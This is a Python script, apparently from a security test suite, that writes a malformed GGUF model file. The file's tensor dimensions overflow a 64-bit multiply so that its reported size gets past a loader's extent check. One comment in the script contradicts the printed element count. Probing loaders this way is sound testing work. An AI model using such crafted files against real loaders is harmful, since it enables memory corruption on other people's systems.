#!/usr/bin/env python3
"""Extra malformed-GGUF cases for the loader guard-page probe."""
import struct, os

OUT = os.path.dirname(os.path.abspath(__file__))
ALIGN = 32

def s(x):
    b = x.encode()
    return struct.pack("<Q", len(b)) + b

def kv_u32(k, v): return s(k) + struct.pack("<II", 4, v)

def tensor(name, dims, typ, off):
    return (s(name) + struct.pack("<I", len(dims)) +
            b"".join(struct.pack("<Q", d) for d in dims) +
            struct.pack("<IQ", typ, off))

def finish(kvs, tensors, data=b""):
    body = b"GGUF" + struct.pack("<IQQ", 3, len(tensors), len(kvs)) + \
           b"".join(kvs) + b"".join(tensors)
    d = (len(body) + ALIGN - 1) // ALIGN * ALIGN
    return body + b"\0" * (d - len(body)) + data

# F32 with dims whose product wraps mod 2^64 to a small value:
#   ((2^34)+1) * 2^30 = 2^64 + 2^30  ->  wraps to 2^30 elements
#   nbytes reported = 2^32, which fits inside the 7 GB data region, so the
#   new extent check cannot see it.  The true element count is 2^30.
kvs = [kv_u32("general.alignment", ALIGN)]
ts = [tensor("t0", [(1 << 34) + 1, 1 << 30], 0, 0)]
open(os.path.join(OUT, "dims_overflow.gguf"), "wb").write(finish(kvs, ts))
print("dims_overflow.gguf  claimed nbytes=2^32  real elements=2^64+2^30")
